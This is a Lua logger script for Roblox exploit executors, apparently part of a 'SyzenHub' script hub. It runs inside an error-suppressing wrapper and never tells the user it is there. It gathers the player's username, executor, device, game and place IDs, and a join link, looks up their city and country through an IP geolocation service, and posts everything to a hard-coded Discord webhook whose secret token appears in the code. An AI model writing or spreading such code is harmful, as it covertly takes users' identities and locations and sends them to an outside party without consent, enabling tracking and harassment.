local HttpService = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/1386352896899284992/wIeRGYiwZmYRK7g5z1W-wsFdSMjtM02lm8qKifvWmMQeUA2V44z8NjSURPN4UInDXzlS"

pcall(function()
    local plr = game.Players.LocalPlayer
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local device = (getidentity and getidentity().device) or (getexecutorname and getexecutorname()) or "Unknown Device"
    local gameId = tostring(game.GameId)
    local placeId = tostring(game.PlaceId)
    local joinLink = "roblox://placeId=" .. placeId

    -- Time
    local function getTime()
        return os.date("%I:%M %p")
    end

    -- IP Geolocation
    local city, country = "Unknown", "Unknown"
    local success, res = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    if success and res then
        city = res.city or city
        country = res.country or country
    end

    -- Webhook embed
    local embed = {
        title = "🟢 SyzenHub Script Executed",
        color = 65280,
        fields = {
            { name = "👤 Username", value = plr.Name, inline = true },
            { name = "🧠 Executor", value = executor, inline = true },
            { name = "📱 Device", value = device, inline = true },
            { name = "🌍 Location", value = city .. ", " .. country, inline = true },
            { name = "🕒 Time", value = getTime(), inline = true },
            { name = "🎮 Game ID", value = gameId, inline = true },
            { name = "🔗 Join Game", value = "["..placeId.."]("..joinLink..")", inline = false }
        }
    }

    -- Payload
    local payload = HttpService:JSONEncode({
        embeds = {embed},
        username = "Syzen Logger"
    })

    -- Send request
    local req = syn and syn.request or http and http.request or http_request
    if req then
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end
end)
